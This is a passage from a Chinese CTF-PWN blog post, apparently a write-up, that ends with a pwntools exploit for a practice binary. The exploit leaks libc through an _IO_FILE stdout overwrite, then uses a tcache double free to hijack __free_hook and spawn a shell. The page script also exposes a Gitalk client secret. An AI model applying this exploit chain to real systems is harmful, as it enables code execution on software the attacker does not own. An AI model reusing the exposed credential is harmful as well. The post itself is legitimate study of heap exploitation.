    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x58'</span>
    <span class="token comment" spellcheck="true">#gdb.attach(sh,'b*new_do_write')</span>
    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    libc_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_file_jumps'</span><span class="token punctuation">]</span>
    free_hook <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
    system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    show_addr<span class="token punctuation">(</span><span class="token string">'libc_addr'</span><span class="token punctuation">,</span>libc_addr<span class="token punctuation">)</span>
    show_addr<span class="token punctuation">(</span><span class="token string">'free_hook'</span><span class="token punctuation">,</span>free_hook<span class="token punctuation">)</span>
    show_addr<span class="token punctuation">(</span><span class="token string">'system_addr'</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'\x50'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
    delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./IO_FILE'</span><span class="token punctuation">)</span>
            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>但是用这个方法的时候遇到一个小问题：<br>前面malloc获得_IO_2_1_stdout的chunk后rsi就是0xfbad2887然而在调用printf的时候进入vfprintf并没有执行，也就是没有输出，当时我以为是我脚本的问题，就没用这个方法了</p>
<pre class=" language-java"><code class="language-java"> ► <span class="token number">0x400951</span> <span class="token operator">&lt;</span>add<span class="token operator">+</span><span class="token number">345</span><span class="token operator">></span>    call   printf<span class="token annotation punctuation">@plt</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">></span>
        format<span class="token operator">:</span> <span class="token number">0x400ba5</span> <span class="token operator">&lt;</span>— <span class="token string">'description:'</span>
        vararg<span class="token operator">:</span> <span class="token number">0xfbad2887</span></code></pre>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
<li>读源码是是一个好习惯，之前都没怎么理解这些构造方法，不能仅仅就看看大佬的文章</li>
<li>这个题除了IO_FILE攻击还有就是tcache 的free chunk转移：篡改其size，使其free后放入另一个链表，从2019_realloc_magic获得的启发<ul>
<li>其实这两题应该是一样的，2019_realloc_magic用的是realloc函数会进行chunk合并达到了chunk extends<ul>
<li>总之就是在tcacha中多次free 使操作对象成为unsortedbin chunk而不是tcache，达到chunk extends的目的</li>
</ul>
</li>
</ul>
</li>
</ul>

            </div>
            <hr/>

            
            <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.88rem;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff;
        background-color: #22AB38;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff;
        background-color: #019FE8;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close"><i class="fa fa-close"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs">
                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                    </ul>
                    <div id="wechat">
                        <img src="/medias/reward/1.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                    <div id="alipay">
                        <img src="/medias/reward/2.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('#reward .reward-link').on('click', function () {
            $('#rewardModal').openModal();
        });

        $('#rewardModal .close').on('click', function () {
            $('#rewardModal').closeModal();
        });
    });
</script>
            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            <div class="reprint">
                <p>
                    <span class="reprint-tip">
                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
                    </span>
                    <a href="http://squarepants0.github.io" class="b-link-green">Matrix</a>
                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
                    <a href="/2020/11/27/ji-yu-gong-ji-dui-fwrite-han-shu-de-gen-zong/" class="b-link-green">基于攻击对fwrite函数的跟踪</a>
                </p>
            </div>
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: 'aa0bf75cc88de6c0258a',
        clientSecret: '8ddc9bf71af314ac63d189a5ecb132fac7c0687d',
        repo: 'Gitalks.github.io',
        owner: 'squarepants0',
        admin: "squarepants0",
        id: '2020-11-27T11-28-42',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>
    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
            </div>
            <div class="card">
                <a href="/2020/11/27/ji-yu-gong-ji-dui-fwrite-han-shu-de-gen-zong/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="基于攻击对fwrite函数的跟踪">
                        
                        <span class="card-title">基于攻击对fwrite函数的跟踪</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">fwrite功能：C 库函数 size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream) 把 ptr 所指向的数组中的数据写入到给定流 stream 中。申</div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-27
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF-PWN/" class="post-category" target="_blank">
                                    CTF-PWN
                                </a>
                            
                            <a href="/categories/CTF-PWN/2020-AXB/" class="post-category" target="_blank">
                                    2020-AXB
                                </a>
                            
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" target="_blank">
                        <span class="chip bg-color">原理学习</span>
                    </a>
                    
                    <a href="/tags/IO-FILE/" target="_blank">
                        <span class="chip bg-color">IO_FILE</span>
                    </a>
                    
                    <a href="/tags/Tcache/" target="_blank">
                        <span class="chip bg-color">Tcache</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/11/23/sandbox/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Sandbox">
                        
                        <span class="card-title">Sandbox</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">沙箱因为用户层对数据的一切操作到底都是需要通过系统调用来完成的，那么只要对某些危险的系统调用进行限制，用户层的程序就比较难进行恶意的系统调用
seccommpshort for secure computing mode(wiki)是一种限</div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-23
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF-PWN/" class="post-category" target="_blank">
                                    CTF-PWN
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" target="_blank">
                        <span class="chip bg-color">原理学习</span>
                    </a>
                    
                    <a href="/tags/Sandbox/" target="_blank">
                        <span class="chip bg-color">Sandbox</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('10')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: Matrix<br />'
            + '作者: IT YUAN<br />'
            + '链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者Matrix所有，任何形式的转载都请注明出处：https://squarepants0.github.io/。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>

    </div>
    <div class="col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            // headingsOffset: -205,
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });
    });
</script>
    

</main>


<footer class="page-footer bg-color">
    <div class="container row center-align">
        <div class="col s12 m8 l8 copy-right">
            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.

            
                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
                <span class="white-color">121.7k</span>
            

            
			
                <br>
                
                <span id="busuanzi_container_site_pv">
                    <i class="fa fa-heart-o"></i>
                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
                </span>
                
                
                <span id="busuanzi_container_site_uv">
                    <i class="fa fa-users"></i>
                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
                </span>
                
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">


    <a href="mailto:2337463603@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fa fa-envelope-open"></i>
    </a>



    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2334763603" target="_blank" rel="noopener" class="tooltipped" data-tooltip="QQ联系我: 2334763603" data-position="top" data-delay="50">
        <i class="fa fa-qq"></i>
    </a>


</div>
    </div>
</footer>

<div class="progress-bar"></div>


<!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input" autofocus="">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
</script>
<!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-up"></i>
    </a>
</div>


<script src="/libs/materialize/js/materialize.min.js"></script>
<script src="/libs/masonry/masonry.pkgd.min.js"></script>
<script src="/libs/aos/aos.js"></script>
<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
<script src="/js/matery.js"></script>

<!-- Global site tag (gtag.js) - Google Analytics -->




    <script async src="/libs/others/busuanzi.pure.mini.js"></script>


<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
<script type="text/javascript" src="/js/fireworks.js"></script>

</body>
</html>